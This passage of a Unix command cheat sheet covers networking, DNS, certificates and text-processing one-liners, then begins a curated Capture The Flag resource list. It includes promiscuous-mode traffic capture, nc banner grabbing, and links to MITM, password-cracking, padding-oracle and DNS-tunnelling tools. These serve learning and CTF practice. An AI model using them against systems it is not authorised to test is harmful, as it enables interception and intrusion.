</code></pre><ul><li><code>-</code> - standard input (STDIO)<li><code>TCP4:&lt;params></code> - set tcp4 connection with specific params<ul><li><code>[hostname|ip]</code> - set hostname/ip<li><code>[1-65535]</code> - set port number</ul></ul><h6><a class=header href=#redirecting-tcp-traffic-to-a-unix-domain-socket-under-linux id=redirecting-tcp-traffic-to-a-unix-domain-socket-under-linux>Redirecting TCP-traffic to a UNIX domain socket under Linux</a></h6><pre><code class=language-bash>socat TCP-LISTEN:1234,bind=127.0.0.1,reuseaddr,fork,su=nobody,range=127.0.0.0/8 UNIX-CLIENT:/tmp/foo
</code></pre><ul><li><code>TCP-LISTEN:&lt;params></code> - set tcp listen with specific params<ul><li><code>[1-65535]</code> - set port number<li><code>bind=[hostname|ip]</code> - set bind hostname/ip<li><code>reuseaddr</code> - allows other sockets to bind to an address<li><code>fork</code> - keeps the parent process attempting to produce more connections<li><code>su=nobody</code> - set user<li><code>range=[ip-range]</code> - ip range</ul><li><code>UNIX-CLIENT:&lt;params></code> - communicates with the specified peer socket<ul><li><code>filename</code> - define socket</ul></ul><hr><h5><a class=header href=#tool-a-hrefhttplcamtufcoredumpcxp0f3p0fa id=tool-a-hrefhttplcamtufcoredumpcxp0f3p0fa>Tool: <a href=http://lcamtuf.coredump.cx/p0f3/>p0f</a></a></h5><h6><a class=header href=#set-iface-in-promiscuous-mode-and-dump-traffic-to-the-log-file id=set-iface-in-promiscuous-mode-and-dump-traffic-to-the-log-file>Set iface in promiscuous mode and dump traffic to the log file</a></h6><pre><code class=language-bash>p0f -i enp0s25 -p -d -o /dump/enp0s25.log
</code></pre><ul><li><code>-i</code> - listen on the specified interface<li><code>-p</code> - set interface in promiscuous mode<li><code>-d</code> - fork into background<li><code>-o</code> - output file</ul><hr><h5><a class=header href=#tool-a-hrefhttpsenwikipediaorgwikinetstatnetstata id=tool-a-hrefhttpsenwikipediaorgwikinetstatnetstata>Tool: <a href=https://en.wikipedia.org/wiki/Netstat>netstat</a></a></h5><h6><a class=header href=#graph--of-connections-for-each-hosts id=graph--of-connections-for-each-hosts>Graph # of connections for each hosts</a></h6><pre><code class=language-bash>netstat -an | awk '/ESTABLISHED/ { split($5,ip,&quot;:&quot;); if (ip[1] !~ /^$/) print ip[1] }' | \
sort | uniq -c | awk '{ printf(&quot;%s\t%s\t&quot;,$2,$1) ; for (i = 0; i &lt; $1; i++) {printf(&quot;*&quot;)}; print &quot;&quot; }'
</code></pre><h6><a class=header href=#monitor-open-connections-for-specific-port-including-listen-count-and-sort-it-per-ip id=monitor-open-connections-for-specific-port-including-listen-count-and-sort-it-per-ip>Monitor open connections for specific port including listen, count and sort it per IP</a></h6><pre><code class=language-bash>watch &quot;netstat -plan | grep :443 | awk {'print \$5'} | cut -d: -f 1 | sort | uniq -c | sort -nk 1&quot;
</code></pre><h6><a class=header href=#grab-banners-from-local-ipv4-listening-ports id=grab-banners-from-local-ipv4-listening-ports>Grab banners from local IPv4 listening ports</a></h6><pre><code class=language-bash>netstat -nlt | grep 'tcp ' | grep -Eo &quot;[1-9][0-9]*&quot; | xargs -I {} sh -c &quot;echo &quot;&quot; | nc -v -n -w1 127.0.0.1 {}&quot;
</code></pre><hr><h5><a class=header href=#tool-a-hrefhttpsenwikipediaorgwikirsyncrsynca id=tool-a-hrefhttpsenwikipediaorgwikirsyncrsynca>Tool: <a href=https://en.wikipedia.org/wiki/Rsync>rsync</a></a></h5><h6><a class=header href=#rsync-remote-data-as-root-using-sudo id=rsync-remote-data-as-root-using-sudo>Rsync remote data as root using sudo</a></h6><pre><code class=language-bash>rsync --rsync-path 'sudo rsync' username@hostname:/path/to/dir/ /local/
</code></pre><hr><h5><a class=header href=#tool-a-hrefhttpsenwikipediaorgwikihost_unixhosta id=tool-a-hrefhttpsenwikipediaorgwikihost_unixhosta>Tool: <a href=https://en.wikipedia.org/wiki/Host_(Unix)>host</a></a></h5><h6><a class=header href=#resolves-the-domain-name-using-external-dns-server id=resolves-the-domain-name-using-external-dns-server>Resolves the domain name (using external dns server)</a></h6><pre><code class=language-bash>host google.com 9.9.9.9
</code></pre><h6><a class=header href=#checks-the-domain-administrator-soa-record id=checks-the-domain-administrator-soa-record>Checks the domain administrator (SOA record)</a></h6><pre><code class=language-bash>host -t soa google.com 9.9.9.9
</code></pre><hr><h5><a class=header href=#tool-a-hrefhttpsenwikipediaorgwikidig_commanddiga id=tool-a-hrefhttpsenwikipediaorgwikidig_commanddiga>Tool: <a href=https://en.wikipedia.org/wiki/Dig_(command)>dig</a></a></h5><h6><a class=header href=#resolves-the-domain-name-short-output id=resolves-the-domain-name-short-output>Resolves the domain name (short output)</a></h6><pre><code class=language-bash>dig google.com +short
</code></pre><h6><a class=header href=#lookup-ns-record-for-specific-domain id=lookup-ns-record-for-specific-domain>Lookup NS record for specific domain</a></h6><pre><code class=language-bash>dig @9.9.9.9 google.com NS
</code></pre><h6><a class=header href=#query-only-answer-section id=query-only-answer-section>Query only answer section</a></h6><pre><code class=language-bash>dig google.com +nocomments +noquestion +noauthority +noadditional +nostats
</code></pre><h6><a class=header href=#query-all-dns-records id=query-all-dns-records>Query ALL DNS Records</a></h6><pre><code class=language-bash>dig google.com ANY +noall +answer
</code></pre><h6><a class=header href=#dns-reverse-look-up id=dns-reverse-look-up>DNS Reverse Look-up</a></h6><pre><code class=language-bash>dig -x 172.217.16.14 +short
</code></pre><hr><h5><a class=header href=#tool-a-hrefhttpscertbotefforgcertbota id=tool-a-hrefhttpscertbotefforgcertbota>Tool: <a href=https://certbot.eff.org/>certbot</a></a></h5><h6><a class=header href=#generate-multidomain-certificate id=generate-multidomain-certificate>Generate multidomain certificate</a></h6><pre><code class=language-bash>certbot certonly -d example.com -d www.example.com
</code></pre><h6><a class=header href=#generate-wildcard-certificate id=generate-wildcard-certificate>Generate wildcard certificate</a></h6><pre><code class=language-bash>certbot certonly --manual --preferred-challenges=dns -d example.com -d *.example.com
</code></pre><h6><a class=header href=#generate-certificate-with-4096-bit-private-key id=generate-certificate-with-4096-bit-private-key>Generate certificate with 4096 bit private key</a></h6><pre><code class=language-bash>certbot certonly -d example.com -d www.example.com --rsa-key-size 4096
</code></pre><hr><h5><a class=header href=#tool-a-hrefhttpsgithubcomtrimstraythe-book-of-secret-knowledgetool-network-othernetwork-othera id=tool-a-hrefhttpsgithubcomtrimstraythe-book-of-secret-knowledgetool-network-othernetwork-othera>Tool: <a href=https://github.com/trimstray/the-book-of-secret-knowledge#tool-network-other>network-other</a></a></h5><h6><a class=header href=#get-all-subnets-for-specific-as-autonomous-system id=get-all-subnets-for-specific-as-autonomous-system>Get all subnets for specific AS (Autonomous system)</a></h6><pre><code class=language-bash>AS=&quot;AS32934&quot;
whois -h whois.radb.net -- &quot;-i origin ${AS}&quot; | \
grep &quot;^route:&quot; | \
cut -d &quot;:&quot; -f2 | \
sed -e 's/^[ \t]//' | \
sort -n -t . -k 1,1 -k 2,2 -k 3,3 -k 4,4 | \
cut -d &quot;:&quot; -f2 | \
sed -e 's/^[ \t]/allow /' | \
sed 's/$/;/' | \
sed 's/allow  */subnet -&gt; /g'
</code></pre><h6><a class=header href=#resolves-domain-name-from-dnsgooglecom-with-curl-and-jq id=resolves-domain-name-from-dnsgooglecom-with-curl-and-jq>Resolves domain name from dns.google.com with curl and jq</a></h6><pre><code class=language-bash>_dname=&quot;google.com&quot; ; curl -s &quot;https://dns.google.com/resolve?name=${_dname}&amp;type=A&quot; | jq .
</code></pre><h5><a class=header href=#tool-a-hrefhttpsgit-scmcomgita id=tool-a-hrefhttpsgit-scmcomgita>Tool: <a href=https://git-scm.com/>git</a></a></h5><h6><a class=header href=#log-alias-for-a-decent-view-of-your-repo id=log-alias-for-a-decent-view-of-your-repo>Log alias for a decent view of your repo</a></h6><pre><code class=language-bash># 1)
git log --oneline --decorate --graph --all

# 2)
git log --graph \
--pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset' \
--abbrev-commit
</code></pre><hr><h5><a class=header href=#tool-a-hrefhttpswwwpythonorgpythona id=tool-a-hrefhttpswwwpythonorgpythona>Tool: <a href=https://www.python.org/>python</a></a></h5><h6><a class=header href=#static-http-web-server id=static-http-web-server>Static HTTP web server</a></h6><pre><code class=language-bash># Python 3.x
python3 -m http.server 8000 --bind 127.0.0.1

# Python 2.x
python -m SimpleHTTPServer 8000
</code></pre><h6><a class=header href=#static-http-web-server-with-ssl-support id=static-http-web-server-with-ssl-support>Static HTTP web server with SSL support</a></h6><pre><code class=language-bash># Python 3.x
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('localhost', 4443), BaseHTTPRequestHandler)

httpd.socket = ssl.wrap_socket (httpd.socket,
        keyfile=&quot;path/to/key.pem&quot;,
        certfile='path/to/cert.pem', server_side=True)

httpd.serve_forever()

# Python 2.x
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('localhost', 4443),
        SimpleHTTPServer.SimpleHTTPRequestHandler)

httpd.socket = ssl.wrap_socket (httpd.socket,
        keyfile=&quot;path/tp/key.pem&quot;,
        certfile='path/to/cert.pem', server_side=True)

httpd.serve_forever()
</code></pre><h6><a class=header href=#encode-base64 id=encode-base64>Encode base64</a></h6><pre><code class=language-bash>python -m base64 -e &lt;&lt;&lt; &quot;sample string&quot;
</code></pre><h6><a class=header href=#decode-base64 id=decode-base64>Decode base64</a></h6><pre><code class=language-bash>python -m base64 -d &lt;&lt;&lt; &quot;dGhpcyBpcyBlbmNvZGVkCg==&quot;
</code></pre><h5><a class=header href=#tool-a-hrefhttpwwwgrymoirecomunixawkhtmlawka id=tool-a-hrefhttpwwwgrymoirecomunixawkhtmlawka>Tool: <a href=http://www.grymoire.com/Unix/Awk.html>awk</a></a></h5><h6><a class=header href=#search-for-matching-lines id=search-for-matching-lines>Search for matching lines</a></h6><pre><code class=language-bash># egrep foo
awk '/foo/' filename
</code></pre><h6><a class=header href=#search-non-matching-lines id=search-non-matching-lines>Search non matching lines</a></h6><pre><code class=language-bash># egrep -v foo
awk '!/foo/' filename
</code></pre><h6><a class=header href=#print-matching-lines-with-numbers id=print-matching-lines-with-numbers>Print matching lines with numbers</a></h6><pre><code class=language-bash># egrep -n foo
awk '/foo/{print FNR,$0}' filename
</code></pre><h6><a class=header href=#print-the-last-column id=print-the-last-column>Print the last column</a></h6><pre><code class=language-bash>awk '{print $NF}' filename
</code></pre><h6><a class=header href=#find-all-the-lines-longer-than-80-characters id=find-all-the-lines-longer-than-80-characters>Find all the lines longer than 80 characters</a></h6><pre><code class=language-bash>awk 'length($0)&gt;80{print FNR,$0}' filename
</code></pre><h6><a class=header href=#print-only-lines-of-less-than-80-characters id=print-only-lines-of-less-than-80-characters>Print only lines of less than 80 characters</a></h6><pre><code class=language-bash>awk 'length &lt; 80 filename
</code></pre><h6><a class=header href=#print-double-new-lines-a-file id=print-double-new-lines-a-file>Print double new lines a file</a></h6><pre><code class=language-bash>awk '1; { print &quot;&quot; }' filename
</code></pre><h6><a class=header href=#print-line-numbers id=print-line-numbers>Print line numbers</a></h6><pre><code class=language-bash>awk '{ print FNR &quot;\t&quot; $0 }' filename
awk '{ printf(&quot;%5d : %s\n&quot;, NR, $0) }' filename   # in a fancy manner
</code></pre><h6><a class=header href=#print-line-numbers-for-only-non-blank-lines id=print-line-numbers-for-only-non-blank-lines>Print line numbers for only non-blank lines</a></h6><pre><code class=language-bash>awk 'NF { $0=++a &quot; :&quot; $0 }; { print }' filename
</code></pre><h6><a class=header href=#print-the-line-and-the-next-two-i5-lines-after-the-line-matching-regexp id=print-the-line-and-the-next-two-i5-lines-after-the-line-matching-regexp>Print the line and the next two (i=5) lines after the line matching regexp</a></h6><pre><code class=language-bash>awk '/foo/{i=5+1;}{if(i){i--; print;}}' filename
</code></pre><h6><a class=header href=#print-the-lines-starting-at-the-line-matching-server--until-the-line-matching- id=print-the-lines-starting-at-the-line-matching-server--until-the-line-matching->Print the lines starting at the line matching 'server {' until the line matching '}'</a></h6><pre><code class=language-bash>awk '/server {/,/}/' filename
</code></pre><h6><a class=header href=#print-multiple-columns-with-separators id=print-multiple-columns-with-separators>Print multiple columns with separators</a></h6><pre><code class=language-bash>awk -F' ' '{print &quot;ip:\t&quot; $2 &quot;\n port:\t&quot; $3' filename
</code></pre><h6><a class=header href=#remove-empty-lines id=remove-empty-lines>Remove empty lines</a></h6><pre><code class=language-bash>awk 'NF &gt; 0' filename

# alternative:
awk NF filename
</code></pre><h6><a class=header href=#delete-trailing-white-space-spaces-tabs id=delete-trailing-white-space-spaces-tabs>Delete trailing white space (spaces, tabs)</a></h6><pre><code class=language-bash>awk '{sub(/[ \t]*$/, &quot;&quot;);print}' filename
</code></pre><h6><a class=header href=#delete-leading-white-space id=delete-leading-white-space>Delete leading white space</a></h6><pre><code class=language-bash>awk '{sub(/^[ \t]+/, &quot;&quot;); print}' filename
</code></pre><h6><a class=header href=#remove-duplicate-consecutive-lines id=remove-duplicate-consecutive-lines>Remove duplicate consecutive lines</a></h6><pre><code class=language-bash># uniq
awk 'a !~ $0{print}; {a=$0}' filename
</code></pre><h6><a class=header href=#remove-duplicate-entries-in-a-file-without-sorting id=remove-duplicate-entries-in-a-file-without-sorting>Remove duplicate entries in a file without sorting</a></h6><pre><code class=language-bash>awk '!x[$0]++' filename
</code></pre><h6><a class=header href=#exclude-multiple-columns id=exclude-multiple-columns>Exclude multiple columns</a></h6><pre><code class=language-bash>awk '{$1=$3=&quot;&quot;}1' filename
</code></pre><h6><a class=header href=#substitute-foo-for-bar-on-lines-matching-regexp id=substitute-foo-for-bar-on-lines-matching-regexp>Substitute foo for bar on lines matching regexp</a></h6><pre><code class=language-bash>awk '/regexp/{gsub(/foo/, &quot;bar&quot;)};{print}' filename
</code></pre><h6><a class=header href=#add-some-characters-at-the-beginning-of-matching-lines id=add-some-characters-at-the-beginning-of-matching-lines>Add some characters at the beginning of matching lines</a></h6><pre><code class=language-bash>awk '/regexp/{sub(/^/, &quot;++++&quot;); print;next;}{print}' filename
</code></pre><h6><a class=header href=#get-the-last-hour-of-apache-logs id=get-the-last-hour-of-apache-logs>Get the last hour of Apache logs</a></h6><pre><code class=language-bash>awk '/'$(date -d &quot;1 hours ago&quot; &quot;+%d\\/%b\\/%Y:%H:%M&quot;)'/,/'$(date &quot;+%d\\/%b\\/%Y:%H:%M&quot;)'/ { print $0 }' \
/var/log/httpd/access_log
</code></pre><hr><h5><a class=header href=#tool-a-hrefhttpwwwgrymoirecomunixsedhtmlseda id=tool-a-hrefhttpwwwgrymoirecomunixsedhtmlseda>Tool: <a href=http://www.grymoire.com/Unix/Sed.html>sed</a></a></h5><h6><a class=header href=#print-a-specific-line-from-a-file id=print-a-specific-line-from-a-file>Print a specific line from a file</a></h6><pre><code class=language-bash>sed -n 10p /path/to/file
</code></pre><h6><a class=header href=#remove-a-specific-line-from-a-file id=remove-a-specific-line-from-a-file>Remove a specific line from a file</a></h6><pre><code class=language-bash>sed -i 10d /path/to/file
# alternative (BSD): sed -i'' 10d /path/to/file
</code></pre><h6><a class=header href=#remove-a-range-of-lines-from-a-file id=remove-a-range-of-lines-from-a-file>Remove a range of lines from a file</a></h6><pre><code class=language-bash>sed -i &lt;file&gt; -re '&lt;start&gt;,&lt;end&gt;d'
</code></pre><h6><a class=header href=#replace-newlines-with-a-space id=replace-newlines-with-a-space>Replace newline(s) with a space</a></h6><pre><code class=language-bash>sed ':a;N;$!ba;s/\n/ /g' /path/to/file

# cross-platform compatible syntax:
sed -e ':a' -e 'N' -e '$!ba' -e 's/\n/ /g' /path/to/file
</code></pre><ul><li><code>:a</code> create a label <code>a</code><li><code>N</code> append the next line to the pattern space<li><code>$!</code> if not the last line, ba branch (go to) label <code>a</code><li><code>s</code> substitute, <code>/\n/</code> regex for new line, <code>/ /</code> by a space, <code>/g</code> global match (as many times as it can)</ul><p>Alternatives:<pre><code class=language-bash># perl version (sed-like speed):
perl -p -e 's/\n/ /' /path/to/file

# bash version (slow):
while read line ; do printf &quot;%s&quot; &quot;$line &quot; ; done &lt; file
</code></pre><h6><a class=header href=#delete-string-n-next-lines id=delete-string-n-next-lines>Delete string +N next lines</a></h6><pre><code class=language-bash>sed '/start/,+4d' /path/to/file
</code></pre><hr><h5><a class=header href=#tool-a-hrefhttpwwwgrymoirecomunixgrephtmlgrepa id=tool-a-hrefhttpwwwgrymoirecomunixgrephtmlgrepa>Tool: <a href=http://www.grymoire.com/Unix/Grep.html>grep</a></a></h5><h6><a class=header href=#search-for-a-pattern-inside-all-files-in-the-current-directory id=search-for-a-pattern-inside-all-files-in-the-current-directory>Search for a "pattern" inside all files in the current directory</a></h6><pre><code class=language-bash>grep -rn &quot;pattern&quot;
grep -RnisI &quot;pattern&quot; *
fgrep &quot;pattern&quot; * -R
</code></pre><h6><a class=header href=#show-only-for-multiple-patterns id=show-only-for-multiple-patterns>Show only for multiple patterns</a></h6><pre><code class=language-bash>grep 'INFO*'\''WARN' filename
grep 'INFO\|WARN' filename
grep -e INFO -e WARN filename
grep -E '(INFO|WARN)' filename
egrep &quot;INFO|WARN&quot; filename
</code></pre><h6><a class=header href=#except-multiple-patterns id=except-multiple-patterns>Except multiple patterns</a></h6><pre><code class=language-bash>grep -vE '(error|critical|warning)' filename
</code></pre><h6><a class=header href=#show-data-from-file-without-comments id=show-data-from-file-without-comments>Show data from file without comments</a></h6><pre><code class=language-bash>grep -v ^[[]]*# filename
</code></pre><h6><a class=header href=#show-data-from-file-without-comments-and-new-lines id=show-data-from-file-without-comments-and-new-lines>Show data from file without comments and new lines</a></h6><pre><code class=language-bash>egrep -v '#|^$' filename
</code></pre><h6><a class=header href=#show-strings-with-a-dashhyphen id=show-strings-with-a-dashhyphen>Show strings with a dash/hyphen</a></h6><pre><code class=language-bash>grep -e -- filename
grep -- -- filename
grep &quot;\-\-&quot; filename
</code></pre><h6><a class=header href=#remove-blank-lines-from-a-file-and-save-output-to-new-file id=remove-blank-lines-from-a-file-and-save-output-to-new-file>Remove blank lines from a file and save output to new file</a></h6><pre><code class=language-bash>grep . filename &gt; newfilename
</code></pre><h5><a class=header href=#tool-a-hrefhttpswwwperlorgperla id=tool-a-hrefhttpswwwperlorgperla>Tool: <a href=https://www.perl.org/>perl</a></a></h5><h6><a class=header href=#search-and-replace-in-place id=search-and-replace-in-place>Search and replace (in place)</a></h6><pre><code class=language-bash>perl -i -pe's/SEARCH/REPLACE/' filename
</code></pre><h6><a class=header href=#edit-of-conf-files-changing-all-foo-to-bar-and-backup-original id=edit-of-conf-files-changing-all-foo-to-bar-and-backup-original>Edit of <code>*.conf</code> files changing all foo to bar (and backup original)</a></h6><pre><code class=language-bash>perl -p -i.orig -e 's/\bfoo\b/bar/g' *.conf
</code></pre><h6><a class=header href=#prints-the-first-20-lines-from-conf-files id=prints-the-first-20-lines-from-conf-files>Prints the first 20 lines from <code>*.conf</code> files</a></h6><pre><code class=language-bash>perl -pe 'exit if $. &gt; 20' *.conf
</code></pre><h6><a class=header href=#search-lines-10-to-20 id=search-lines-10-to-20>Search lines 10 to 20</a></h6><pre><code class=language-bash>perl -ne 'print if 10 .. 20' filename
</code></pre><h6><a class=header href=#delete-first-10-lines-and-backup-original id=delete-first-10-lines-and-backup-original>Delete first 10 lines (and backup original)</a></h6><pre><code class=language-bash>perl -i.orig -ne 'print unless 1 .. 10' filename
</code></pre><h6><a class=header href=#delete-all-but-lines-between-foo-and-bar-and-backup-original id=delete-all-but-lines-between-foo-and-bar-and-backup-original>Delete all but lines between foo and bar (and backup original)</a></h6><pre><code class=language-bash>perl -i.orig -ne 'print unless /^foo$/ .. /^bar$/' filename
</code></pre><h6><a class=header href=#reduce-multiple-blank-lines-to-a-single-line id=reduce-multiple-blank-lines-to-a-single-line>Reduce multiple blank lines to a single line</a></h6><pre><code class=language-bash>perl -p -i -00pe0 filename
</code></pre><h6><a class=header href=#convert-tabs-to-spaces-1t--2sp id=convert-tabs-to-spaces-1t--2sp>Convert tabs to spaces (1t = 2sp)</a></h6><pre><code class=language-bash>perl -p -i -e 's/\t/  /g' filename
</code></pre><h6><a class=header href=#read-input-from-a-file-and-report-number-of-lines-and-characters id=read-input-from-a-file-and-report-number-of-lines-and-characters>Read input from a file and report number of lines and characters</a></h6><pre><code class=language-bash>perl -lne '$i++; $in += length($_); END { print &quot;$i lines, $in characters&quot;; }' filename
</code></pre><h4><a class=header href=#shell-functions-a-hrefmiscellaneoushtmlanger-table-of-contentssuptocsupa id=shell-functions-a-hrefmiscellaneoushtmlanger-table-of-contentssuptocsupa>Shell functions <a href=MISCELLANEOUS.html#anger-table-of-contents><sup>[TOC]</sup></a></a></h4><h5><a class=header href=#table-of-contents-2 id=table-of-contents-2>Table of Contents</a></h5><ul><li><a href=MISCELLANEOUS.html#domain-resolve>Domain resolve</a><li><a href=MISCELLANEOUS.html#get-asn>Get ASN</a></ul><h6><a class=header href=#domain-resolve id=domain-resolve>Domain resolve</a></h6><pre><code class=language-bash># Dependencies:
#   - curl
#   - jq

function DomainResolve() {

  local _host=&quot;$1&quot;

  local _curl_base=&quot;curl --request GET&quot;
  local _timeout=&quot;15&quot;

  _host_ip=$($_curl_base -ks -m &quot;$_timeout&quot; &quot;https://dns.google.com/resolve?name=${_host}&amp;type=A&quot; | \
  jq '.Answer[0].data' | tr -d &quot;\&quot;&quot; 2&gt;/dev/null)

  if [[ -z &quot;$_host_ip&quot; ]] || [[ &quot;$_host_ip&quot; == &quot;null&quot; ]] ; then

    echo -en &quot;Unsuccessful domain name resolution.\\n&quot;

  else

    echo -en &quot;$_host &gt; $_host_ip\\n&quot;

  fi

}
</code></pre><p>Example:<pre><code class=language-bash>shell&gt; DomainResolve nmap.org
nmap.org &gt; 45.33.49.119

shell&gt; DomainResolve nmap.org
Unsuccessful domain name resolution.
</code></pre><h6><a class=header href=#get-asn id=get-asn>Get ASN</a></h6><pre><code class=language-bash># Dependencies:
#   - curl
#   - python

function GetASN() {

  local _ip=&quot;$1&quot;

  local _curl_base=&quot;curl --request GET&quot;
  local _timeout=&quot;15&quot;

  _asn=$($_curl_base -ks -m &quot;$_timeout&quot; &quot;http://ip-api.com/json/${_ip}&quot; | \
  python -c 'import sys, json; print json.load(sys.stdin)[&quot;as&quot;]' 2&gt;/dev/null)

  _state=$(echo $?)

  if [[ -z &quot;$_ip&quot; ]] || [[ &quot;$_ip&quot; == &quot;null&quot; ]] || [[ &quot;$_state&quot; -ne 0 ]]; then

    echo -en &quot;Unsuccessful ASN gathering.\\n&quot;

  else

    echo -en &quot;$_ip &gt; $_asn\\n&quot;

  fi

}
</code></pre><p>Example:<pre><code class=language-bash>shell&gt; GetASN 1.1.1.1
1.1.1.1 &gt; AS13335 Cloudflare, Inc.

shell&gt; GetASN 0.0.0.0
Unsuccessful ASN gathering.
</code></pre><h1><a class=header href=#capture-the-flag id=capture-the-flag>Capture The Flag</a></h1><p><img src=ctf/ctf.jpg alt="alt text" title="Logo Title Text 1"><p>Find the flag<h1><a class=header href=#awesome-ctf-a-hrefhttpstravis-ciorgapsdehalawesome-ctfimg-srchttpstravis-ciorgapsdehalawesome-ctfsvgbranchmaster-altbuild-status-a-a-hrefhttpsgithubcomsindresorhusawesomeimg-srchttpscdnrawgitcomsindresorhusawesomed7305f38d29fed78fa85652e3a63e154dd8e8829mediabadgesvg-altawesome-a id=awesome-ctf-a-hrefhttpstravis-ciorgapsdehalawesome-ctfimg-srchttpstravis-ciorgapsdehalawesome-ctfsvgbranchmaster-altbuild-status-a-a-hrefhttpsgithubcomsindresorhusawesomeimg-srchttpscdnrawgitcomsindresorhusawesomed7305f38d29fed78fa85652e3a63e154dd8e8829mediabadgesvg-altawesome-a>Awesome CTF <a href=https://travis-ci.org/apsdehal/awesome-ctf><img src="https://travis-ci.org/apsdehal/awesome-ctf.svg?branch=master" alt="Build Status"></a> <a href=https://github.com/sindresorhus/awesome><img src=https://cdn.rawgit.com/sindresorhus/awesome/d7305f38d29fed78fa85652e3a63e154dd8e8829/media/badge.svg alt=Awesome></a></a></h1><p>A curated list of <a href=https://en.wikipedia.org/wiki/Capture_the_flag#Computer_security>Capture The Flag</a> (CTF) frameworks, libraries, resources, softwares and tutorials. This list aims to help starters as well as seasoned CTF players to find everything related to CTFs at one place.<h3><a class=header href=#contents id=contents>Contents</a></h3><ul><li><p><a href=ctf/index.html#awesome-ctf>Awesome CTF</a><ul><li><a href=ctf/index.html#create>Create</a><ul><li><a href=ctf/index.html#forensics>Forensics</a><li><a href=ctf/index.html#platforms>Platforms</a><li><a href=ctf/index.html#steganography>Steganography</a><li><a href=ctf/index.html#web>Web</a></ul><li><a href=ctf/index.html#solve>Solve</a><ul><li><a href=ctf/index.html#attacks>Attacks</a><li><a href=ctf/index.html#bruteforcers>Bruteforcers</a><li><a href=ctf/index.html#crypto>Cryptography</a><li><a href=ctf/index.html#exploits>Exploits</a><li><a href=ctf/index.html#forensics-1>Forensics</a><li><a href=ctf/index.html#networking>Networking</a><li><a href=ctf/index.html#reversing>Reversing</a><li><a href=ctf/index.html#services>Services</a><li><a href=ctf/index.html#steganography-1>Steganography</a><li><a href=ctf/index.html#web-1>Web</a></ul></ul><li><p><a href=ctf/index.html#resources>Resources</a><ul><li><a href=ctf/index.html#operating-systems>Operating Systems</a><li><a href=ctf/index.html#starter-packs>Starter Packs</a><li><a href=ctf/index.html#tutorials>Tutorials</a><li><a href=ctf/index.html#wargames>Wargames</a><li><a href=ctf/index.html#websites>Websites</a><li><a href=ctf/index.html#wikis>Wikis</a><li><a href=ctf/index.html#writeups-collections>Writeups Collections</a></ul></ul><h1><a class=header href=#create id=create>Create</a></h1><p><em>Tools used for creating CTF challenges</em><ul><li><a href=https://doc.lagout.org/security/Packt.Kali.Linux.CTF.Blueprints.Jul.2014.ISBN.1783985984.pdf>Kali Linux CTF Blueprints</a> - Online book on building, testing, and customizing your own Capture the Flag challenges.</ul><h2><a class=header href=#forensics id=forensics>Forensics</a></h2><p><em>Tools used for creating Forensics challenges</em><ul><li><a href=https://github.com/iagox86/dnscat2>Dnscat2</a> - Hosts communication through DNS.<li><a href=http://www.kahusecurity.com/posts/registry_dumper_find_and_dump_hidden_registry_keys.html>Registry Dumper</a> - Dump your registry.</ul><h2><a class=header href=#platforms id=platforms>Platforms</a></h2><p><em>Projects that can be used to host a CTF</em><ul><li><a href=https://github.com/isislab/CTFd>CTFd</a> - Platform to host jeopardy style CTFs from ISISLab, NYU Tandon.<li><a href=https://github.com/facebook/fbctf>FBCTF</a> - Platform to host Capture the Flag competitions from Facebook.<li><a href=https://github.com/aau-network-security/haaukins>Haaukins</a>- A Highly Accessible and Automated Virtualization Platform for Security Education.<li><a href=https://github.com/mcpa-stlouis/hack-the-arch>HackTheArch</a> - CTF scoring platform.<li><a href=https://github.com/Nakiami/mellivora>Mellivora</a> - A CTF engine written in PHP.<li><a href=https://github.com/UnrealAkama/NightShade>NightShade</a> - A simple security CTF framework.<li><a href=https://github.com/easyctf/openctf>OpenCTF</a> - CTF in a box. Minimal setup required.<li><a href=https://github.com/picoCTF/picoCTF>PicoCTF</a> - The platform used to run picoCTF. A great framework to host any CTF.<li><a href=https://github.com/pdautry/py_chall_factory>PyChallFactory</a> - Small framework to create/manage/package jeopardy CTF challenges.<li><a href=https://github.com/moloch--/RootTheBox>RootTheBox</a> - A Game of Hackers (CTF Scoreboard & Game Manager).<li><a href=https://github.com/legitbs/scorebot>Scorebot</a> - Platform for CTFs by Legitbs (Defcon).<li><a href=https://github.com/cliffe/SecGen>SecGen</a> - Security Scenario Generator. Creates randomly vulnerable virtual machines.</ul><h2><a class=header href=#steganography id=steganography>Steganography</a></h2><p><em>Tools used to create stego challenges</em><p>Check solve section for steganography.<h2><a class=header href=#web id=web>Web</a></h2><p><em>Tools used for creating Web challenges</em><p><em>JavaScript Obfustcators</em><ul><li><a href=https://github.com/rapid7/metasploit-framework/wiki/How-to-obfuscate-JavaScript-in-Metasploit>Metasploit JavaScript Obfuscator</a><li><a href=https://github.com/mishoo/UglifyJS>Uglify</a></ul><h1><a class=header href=#solve id=solve>Solve</a></h1><p><em>Tools used for solving CTF challenges</em><h2><a class=header href=#attacks id=attacks>Attacks</a></h2><p><em>Tools used for performing various kinds of attacks</em><ul><li><a href=https://github.com/bettercap/bettercap>Bettercap</a> - Framework to perform MITM (Man in the Middle) attacks.<li><a href=https://github.com/tomac/yersinia>Yersinia</a> - Attack various protocols on layer 2.</ul><h2><a class=header href=#crypto-1 id=crypto-1>Crypto</a></h2><p><em>Tools used for solving Crypto challenges</em><ul><li><a href=https://gchq.github.io/CyberChef>CyberChef</a> - Web app for analysing and decoding data.<li><a href=https://github.com/nccgroup/featherduster>FeatherDuster</a> - An automated, modular cryptanalysis tool.<li><a href=https://github.com/iagox86/hash_extender>Hash Extender</a> - A utility tool for performing hash length extension attacks.<li><a href=https://github.com/KishanBagaria/padding-oracle-attacker>padding-oracle-attacker</a> - A CLI tool to execute padding oracle attacks.<li><a href=https://www.unix-ag.uni-kl.de/%7Econrad/krypto/pkcrack.html>PkCrack</a> - A tool for Breaking PkZip-encryption.<li><a href=https://github.com/Ganapati/RsaCtfTool>RSACTFTool</a> - A tool for recovering RSA private key with various attack.<li><a href=https://github.com/ius/rsatool>RSATool</a> - Generate private key with knowledge of p and q.<li><a href=https://github.com/hellman/xortool>XORTool</a> - A tool to analyze multi-byte xor cipher.</ul><h2><a class=header href=#bruteforcers id=bruteforcers>Bruteforcers</a></h2><p><em>Tools used for various kind of bruteforcing (passwords etc.)</em><ul><li><a href=https://hashcat.net/hashcat/>Hashcat</a> - Password Cracker<li><a 